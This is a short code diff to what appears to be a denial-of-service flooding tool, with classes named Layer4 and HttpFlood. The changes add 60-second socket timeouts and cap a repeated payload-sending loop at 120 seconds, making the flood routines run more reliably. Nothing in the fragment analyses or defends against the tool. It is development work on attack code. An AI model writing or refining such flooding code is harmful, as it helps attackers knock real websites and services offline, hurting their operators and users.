@@ -284,6 +284,7 @@ class Layer4(Thread):
         else:
             s = socket(conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        s.settimeout(60)
         s.connect(self._target)
         return s
 
@@ -586,6 +587,7 @@ class HttpFlood(Thread):
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        sock.settimeout(60)
         sock.connect(self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -761,8 +763,10 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, payload)
             sleep(5.01)
+            ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
+                if time() > ts + 120: break
         Tools.safe_close(s)
 
     def AVB(self):
